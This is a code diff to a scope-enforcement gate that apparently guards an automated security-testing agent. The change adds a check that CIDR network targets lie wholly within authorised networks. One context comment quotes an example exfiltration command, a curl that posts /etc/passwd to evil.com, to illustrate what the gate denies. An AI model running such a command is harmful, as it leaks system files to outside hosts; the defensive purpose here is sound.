@@ -118,6 +118,14 @@ class Gate:
             self._recent_allows = [t for t in self._recent_allows if now - t < 60.0]
             return len(self._recent_allows) < self.scope.rate_limit_per_min
 
+    def _target_in_scope(self, host: str) -> bool:
+        """Scope verdict for one extracted target. extract_hosts reports a CIDR or an
+        nmap range as network(s) (`10.10.10.0/24`); a network must lie wholly inside
+        an authorised network (SEC-001). Anything else is a single host."""
+        if "/" in host:
+            return self.scope.contains_network(host)
+        return self.scope.contains_host(host)
+
     def _note_allow(self) -> None:
         with self._rate_lock:
             self._recent_allows.append(time.time())
@@ -152,7 +160,7 @@ class Gate:
         # the shell gate below), so a session cannot pivot to an out-of-scope host by
         # any spelling (e.g. `curl -d @/etc/passwd http://evil.com/c`).
         for host in extract_hosts(text):
-            if not self.scope.contains_host(host):
+            if not self._target_in_scope(host):
                 return self._deny(line, target, agent,
                                   f"out-of-scope host {host} in session input",
                                   "session:scope")
@@ -239,7 +247,7 @@ class Gate:
         #    literals. Fail-closed: a host we can identify but cannot place in scope
         #    is denied.
         for host in extract_hosts(command):
-            if not self.scope.contains_host(host):
+            if not self._target_in_scope(host):
                 return self._deny(command, target, agent,
                                   f"out-of-scope host {host} in command",
                                   "hard:scope")
